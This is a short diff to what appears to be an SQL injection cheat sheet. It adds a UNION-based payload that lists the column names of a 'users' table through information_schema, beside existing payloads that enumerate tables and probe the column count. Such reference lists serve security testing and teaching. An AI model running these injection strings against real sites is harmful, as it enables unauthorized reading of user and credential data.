@@ -36,6 +36,9 @@ Get other databases
 
 Retrieve table names
 - union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()<br />
+
+Retrieve column names of table ‘users’
+- union select 1,group_concat(column_name),3,4,5 from information_schema.columns where  table_name='users' and  table_schema=database()<br />
 - OR
 - ' UNION SELECT NULL--
 - ' UNION SELECT NULL,NULL--
